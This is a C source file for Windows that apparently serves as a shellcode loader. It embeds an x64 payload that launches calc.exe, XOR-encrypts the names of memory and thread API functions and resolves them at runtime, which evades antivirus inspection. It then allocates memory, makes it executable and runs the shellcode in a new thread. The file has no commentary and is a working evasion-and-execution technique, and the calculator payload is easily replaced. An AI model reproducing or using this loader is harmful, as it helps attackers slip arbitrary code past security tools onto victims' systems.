#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned char my_payload[] = { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
  0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
  0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
  0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
  0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
  0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
  0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
  0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
  0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
  0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
  0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
  0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
  0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
  0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
  0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48,
  0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d,
  0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5,
  0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
  0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
  0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89,
  0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00 };
unsigned int my_payload_len = sizeof(my_payload);

// function declarations 
LPVOID (WINAPI * pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
BOOL (WINAPI * pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
HANDLE (WINAPI * pCreateThread)(LPSECURITY_ATTRIBUTES   lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE  lpStartAddress, __drv_aliasesMem LPVOID lpParameter,DWORD dwCreationFlags, LPDWORD lpThreadId);
DWORD (WINAPI * pWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
VOID (WINAPI * pRtlMoveMemory)(VOID UNALIGNED *Destination, const VOID UNALIGNED *Source, SIZE_T Length);

//VirtualAlloc Encrypted 
unsigned char cVirtualAlloc[] = { 0x3d, 0x0, 0x19, 0x1d, 0x1e, 0x8, 0x7, 0x28, 0x7, 0x5, 0x4, 0xa };
unsigned int cVirtualAlloc_len = sizeof(cVirtualAlloc);
//VirtualProtect Encrypted 
unsigned char cVirtualProtect[] = { 0x3d, 0x0, 0x19, 0x1d, 0x1e, 0x8, 0x7, 0x39, 0x19, 0x6, 0x1f, 0xc, 0x8, 0x1d };
unsigned int cVirtualProtect_len = sizeof(cVirtualProtect);
//CreateThread Encrypted
unsigned char cCreateThread[] = { 0x28, 0x1b, 0xe, 0x8, 0x1f, 0xc, 0x3f, 0x1, 0x19, 0xc, 0xa, 0xd };
unsigned int cCreateThread_len = sizeof(cCreateThread);
//WaitForSingleObject Encrypted
unsigned char cWaitForSingleObject[] = { 0x3c, 0x8, 0x2, 0x1d, 0x2d, 0x6, 0x19, 0x3a, 0x2, 0x7, 0xc, 0x5, 0xe, 0x26, 0x9, 0x3, 0xe, 0xa, 0x1f };
unsigned int cWaitForSingleObject_len = sizeof(cWaitForSingleObject);
//RtlMoveMemory Encrypted 
unsigned char cRtlMoveMemory[] = { 0x39, 0x1d, 0x7, 0x24, 0x4, 0x1f, 0xe, 0x24, 0xe, 0x4, 0x4, 0x1b, 0x12 };
unsigned int cRtlMoveMemory_len = sizeof(cRtlMoveMemory);

char my_key[] = "kiki";
void XOR(char * data, size_t data_len, char * key, size_t key_len){
    int j;
    j = 0;
    for(int i=0;i<data_len;i++){
        if(j==key_len-1) j=0;
        data[i] = data[i] ^ key[j];
        j++;
    }
}


int main(void){
    void * my_payload_mem; // memory buffer for the payload
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;

    //decrypting function names
    XOR((char *) cVirtualAlloc, cVirtualAlloc_len, my_key, sizeof(my_key));
    XOR((char *) cVirtualProtect, cVirtualProtect_len, my_key, sizeof(my_key));
    XOR((char *) cCreateThread, cCreateThread_len, my_key, sizeof(my_key));
    XOR((char *) cWaitForSingleObject, cWaitForSingleObject_len, my_key, sizeof(my_key));
    XOR((char *) cRtlMoveMemory, cRtlMoveMemory_len, my_key, sizeof(my_key));
    //allocate mem buffer

    pVirtualAlloc = GetProcAddress(GetModuleHandle("kernel32.dll"), cVirtualAlloc);  
    my_payload_mem = pVirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    pRtlMoveMemory = GetProcAddress(GetModuleHandle("ntdll.dll"), cRtlMoveMemory);
    pRtlMoveMemory(my_payload_mem, my_payload, my_payload_len);


    pVirtualProtect = GetProcAddress(GetModuleHandle("kernel32.dll"), cVirtualProtect);    //make new buffer executable
    rv = pVirtualProtect(my_payload_mem, my_payload_len, PAGE_EXECUTE_READ, &oldprotect);
    if( rv != 0){
        pCreateThread = GetProcAddress(GetModuleHandle("kernel32.dll"), cCreateThread);
        th = pCreateThread(0, 0, (LPTHREAD_START_ROUTINE) my_payload_mem, 0, 0, 0);

        pWaitForSingleObject = GetProcAddress(GetModuleHandle("kernel32.dll"), cWaitForSingleObject);
        pWaitForSingleObject(th, -1);
    }
    return 0;
}
  
